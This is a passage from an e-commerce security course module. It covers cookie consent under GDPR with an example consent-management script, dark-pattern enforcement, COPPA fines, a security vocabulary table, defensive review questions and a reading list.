**COPPA fines:** Up to $51,744 per violation. Notable case: TikTok fined $5.7 million (2019), YouTube/Google fined $170 million (2019) for COPPA violations.

### 10.4 Cookie Consent Management

Under GDPR and ePrivacy Directive, consent must be:
- **Freely given** (no cookie walls that deny service for refusal)
- **Specific** (per purpose: analytics, marketing, functional)
- **Informed** (clear description of what each category does)
- **Unambiguous** (active opt-in, not pre-ticked boxes)
- **Revocable** (as easy to withdraw as to give)

**Cookie categories:**

| Category | Examples | Consent Required (EU) |
|----------|---------|----------------------|
| **Strictly Necessary** | Session ID, cart ID, CSRF token | No (exempt) |
| **Functional** | Language preference, currency, wishlist | Technically optional |
| **Analytics** | Google Analytics 4, Hotjar, Microsoft Clarity | Yes |
| **Marketing** | Meta Pixel, Google Ads, LinkedIn Insight | Yes |

**Cookie consent implementation (example CMP JavaScript):**

```html
<!-- Consent Management Platform (CMP) — e.g., OneTrust, Cookiebot, Osano -->
<script src="https://cdn.cookiebot.com/uc.js" 
        data-cbid="YOUR-DOMAIN-UUID"
        data-blockingmode="auto"  <!-- Automatically blocks scripts until consent -->
        async>
</script>

<!-- Conditionally load GA4 only after analytics consent -->
<!-- data-cookieconsent="statistics" means this script only runs after analytics consent -->
<script data-cookieconsent="statistics" type="text/plain">
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());
  gtag('config', 'G-XXXXXXXXXX', {
    'anonymize_ip': true,  // Additional privacy measure
    'allow_google_signals': false  // Disable advertising features
  });
</script>

<!-- Meta Pixel — only after marketing consent -->
<script data-cookieconsent="marketing" type="text/plain">
  !function(f,b,e,v,n,t,s){...}(window,document,'script',
    'https://connect.facebook.net/en_US/fbevents.js');
  fbq('init', 'YOUR_PIXEL_ID');
  fbq('track', 'PageView');
</script>
```

**Major CMP providers:** OneTrust (enterprise), Cookiebot by Usercentrics (SMB), Osano (developer-friendly), TrustArc (compliance-focused), Didomi (EU-native).

!!! danger "Dark Patterns in Cookie Consent"
    The EU Data Protection Board (EDPB) and national authorities actively investigate and fine companies using dark patterns in consent interfaces:
    - Accept button large/green; Reject button small/grey
    - Reject option buried in "Manage Preferences" requiring multiple clicks
    - Pre-ticked consent boxes
    - Misleading language ("Help us improve" instead of "Allow tracking")
    
    France's CNIL fined Google €150 million and Facebook €60 million in 2022 for making cookie rejection too difficult.

---

## Key Vocabulary

| Term | Definition |
|------|-----------|
| **Magecart** | Web skimming attack injecting JavaScript into checkout pages to steal card data |
| **Credential Stuffing** | Using stolen username/password lists to attempt logins across multiple sites |
| **ATO** | Account Takeover — unauthorized access to a customer's account |
| **TLS** | Transport Layer Security — cryptographic protocol protecting data in transit |
| **HSTS** | HTTP Strict Transport Security — header forcing browser to use HTTPS |
| **Certificate Transparency** | Public logs of all issued TLS certificates; enables unauthorized cert detection |
| **MFA** | Multi-Factor Authentication — requires two or more verification factors |
| **FIDO2/WebAuthn** | Standard for phishing-resistant authentication using public key cryptography |
| **Passkey** | FIDO2 credential synced across devices; replaces passwords |
| **OAuth 2.0** | Authorization framework for delegated resource access without sharing passwords |
| **OIDC** | OpenID Connect — identity layer on OAuth 2.0 enabling "Sign in with Google/Apple" |
| **OWASP Top 10** | List of 10 most critical web application security risks |
| **SQLi** | SQL Injection — inserting malicious SQL into application queries |
| **XSS** | Cross-Site Scripting — injecting malicious JavaScript into pages |
| **IDOR** | Insecure Direct Object Reference — accessing another user's resources via predictable IDs |
| **WAF** | Web Application Firewall — inspects and filters HTTP traffic for attacks |
| **DDoS** | Distributed Denial of Service — overwhelming a service with traffic |
| **Bot Management** | Technology distinguishing human from automated traffic |
| **GDPR** | EU General Data Protection Regulation — comprehensive EU privacy law |
| **CCPA** | California Consumer Privacy Act — California privacy rights law |
| **COPPA** | Children's Online Privacy Protection Act — US law protecting under-13 privacy |
| **CMP** | Consent Management Platform — cookie consent collection and management tool |
| **SIM Swap** | Social engineering attack transferring victim's phone number to attacker's SIM |
| **CSP** | Content Security Policy — HTTP header restricting sources of scripts and resources |

---

## Review Questions

!!! question "Week 10 Review Questions"

    1. **A luxury watch retailer discovers that 8 months of customer checkout data (card numbers, CVVs, and billing addresses) was stolen via a Magecart attack. Trace the complete attack lifecycle from initial compromise through data exfiltration. Then propose a defense-in-depth strategy covering: (a) technical controls to prevent skimming, (b) monitoring to detect an active attack, and (c) incident response steps after discovery. Reference specific technologies (CSP, SRI, hosted payment fields) in your answer.**

    2. **You are the security architect for an e-commerce platform with 2 million registered users. Design a complete authentication system covering: (a) password storage (which algorithm and why), (b) MFA options offered to users (ranked by security), (c) account recovery flows that don't undermine MFA security, and (d) detection and response to credential stuffing attacks. What is the trade-off between security friction and customer experience, and how do passkeys address this trade-off?**

    3. **Identify three OWASP Top 10 vulnerabilities that are particularly dangerous for e-commerce platforms. For each: provide a realistic attack scenario specific to e-commerce (not a generic example), show vulnerable code and the secure alternative, and explain the business impact if exploited. Then explain how a WAF would and would not protect against each vulnerability.**

    4. **A US-based online retailer with $50 million in annual revenue wants to expand to European markets. What GDPR obligations does this create? Design a cookie consent management implementation that is GDPR-compliant — covering consent collection, granular category management, consent withdrawal, and third-party script blocking. What are the consequences of using dark patterns in the consent interface, and what specific dark patterns must be avoided?**

    5. **Compare Cloudflare's DDoS protection approach with AWS Shield Advanced for an e-commerce site that processes $500,000 in sales during its 2-hour Black Friday flash sale. During a past Black Friday, the site was taken offline for 45 minutes by a Layer 7 HTTP flood. For each protection approach: describe the technical mitigation mechanism, estimate the cost, and analyze the trade-offs. What additional bot management measures would you implement to prevent inventory scalping during the same event?**

---

## Further Reading

- OWASP Foundation. (2024). *OWASP Top 10 Web Application Security Risks*. [owasp.org/Top10](https://owasp.org/Top10)
- OWASP Foundation. (2024). *OWASP Cheat Sheet Series*. [cheatsheetseries.owasp.org](https://cheatsheetseries.owasp.org) — Especially: Authentication, Session Management, SQL Injection Prevention, XSS Prevention
- NIST. (2017). *Digital Identity Guidelines (NIST SP 800-63)*. [pages.nist.gov/800-63-3](https://pages.nist.gov/800-63-3) — Authoritative guide to authentication assurance levels
- European Data Protection Board. (2023). *Guidelines on Dark Patterns*. [edpb.europa.eu](https://www.edpb.europa.eu)
- Krebs on Security. (2024). *Magecart and Web Skimming*. [krebsonsecurity.com](https://krebsonsecurity.com) — Brian Krebs reporting on skimming incidents
- Imperva. (2023). *Bad Bot Report 2023*. [imperva.com/resources/reports](https://www.imperva.com/resources/reports)
- Cloudflare. (2024). *DDoS Threat Report*. [cloudflare.com/learning/ddos](https://www.cloudflare.com/learning/ddos/)
- IBM Security. (2023). *Cost of a Data Breach Report 2023*. [ibm.com/security/data-breach](https://www.ibm.com/security/data-breach)
- FTC. (2024). *Final Rule on Fake Reviews and Testimonials*. [ftc.gov](https://www.ftc.gov/news-events/news/press-releases/2024/08/federal-trade-commission-announces-final-rule-banning-fake-reviews-testimonials)
- California Attorney General. (2024). *CCPA Enforcement and Guidance*. [oag.ca.gov/privacy/ccpa](https://oag.ca.gov/privacy/ccpa)

---

[← Week 9](week09.md) | [Course Index](index.md)
